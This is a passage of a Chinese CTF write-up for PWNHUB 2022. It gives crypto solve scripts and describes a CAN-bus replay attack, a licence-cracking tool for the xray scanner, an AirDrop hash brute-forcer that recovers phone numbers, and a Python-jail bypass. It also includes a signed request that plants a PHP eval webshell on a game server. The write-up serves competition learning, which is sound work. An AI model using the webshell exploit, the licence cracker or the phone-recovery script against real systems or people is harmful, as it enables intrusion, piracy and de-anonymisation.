class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h2><p>前置知识<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CAN报文分析，使用重放攻击解题<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>需要去GitHub下载最新版can-utils才能实现挨个手调<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>查看日志 将异常流量提取出来可以更快的调试完毕<br>直接筛选244#（油门流量）的异常流量去进行手调<br><code>./canplayer -I ./xxx.txt -v -i</code>逐行调试命令<br><img src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>表盘在此发生突变所以报文异常为<code>244#000000A60000</code><br>结合一道国外CAN报文题目可以得知<code>19B#00000F000000</code>为门锁攻击异常流量<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>没想到直接交就对了 还没来得及对门锁流量进行调试  还需要对can-utils源码进行更深入学习才行 太菜了<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h2><p>使用 -h 查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>破解xray高级版证书，使用 <span class="hljs-literal">-h</span> 参数查看使用帮助<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>替换xray程序内置公钥，需要指定xray程序文件路径<br><span class="hljs-literal">-g</span> string<br>生成一个永久license，需要指定用户名<br><span class="hljs-literal">-p</span> string<br>解析官方证书，需要指定证书路径<br><br></code></pre></td></tr></table></figure><p>使用<code>.\xray-cracker -p xray-license.lic</code>查看即可<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h2><p>下载附件后一眼Airdrop取证（小姐姐好看捏）  感谢Qsugar师傅送的盘古石<br>导入日志文件<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>利用盘古石 Airdrop 哈希转换工具得到手机号码<br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>爆破脚本 爆破速度感人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h2><p>可以使⽤的字符有``string.ascii_letters + string.digits + “,!?;#+-/$@&amp;|~^&lt;&gt;(){}”<code> 这些⽅法</code>“getattr”, “exec”, “open”, “<strong>builtins</strong>“, “<strong>build_class</strong>“, “<strong>loader</strong>“, “<strong>spec</strong>“<code>都被 禁⽤了，那么这个时候可以选择⽤</code>chr()<code>来绕过，当然也可以⽤</code>eval(input())`绕过。<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>非预期了。。。<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h2><p>注册账号登录即可get flag</p><h2 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h2><p>修改器直接改<br><img src="/mdimg/2022PWNHUB/1.png"><br>将官职修改到督邮以上<br><img src="/mdimg/2022PWNHUB/2.png"><br>重新登陆，查看邮箱<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开附件在<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>可以看到存在漏洞，可以上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>看到密钥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>上传一个木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //一句话<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>蚁剑连接，flag在根目录下<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h2><p>爆破sha256脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span 